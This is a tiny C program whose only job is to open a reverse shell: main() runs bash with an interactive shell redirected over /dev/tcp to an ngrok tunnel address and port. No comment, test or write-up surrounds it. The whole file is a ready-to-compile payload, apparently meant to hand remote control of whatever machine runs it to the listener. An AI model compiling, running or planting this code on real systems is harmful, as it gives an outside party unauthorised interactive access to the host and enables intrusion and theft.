#include <stdio.h>
#include <unistd.h>

int main(void) {
  
  char *thecommand[] = {"/bin/bash", "-c", "/bin/bash -i >& /dev/tcp/0.tcp.ngrok.io/19682 0>&1", NULL};
  execvp(thecommand[0], thecommand);

}
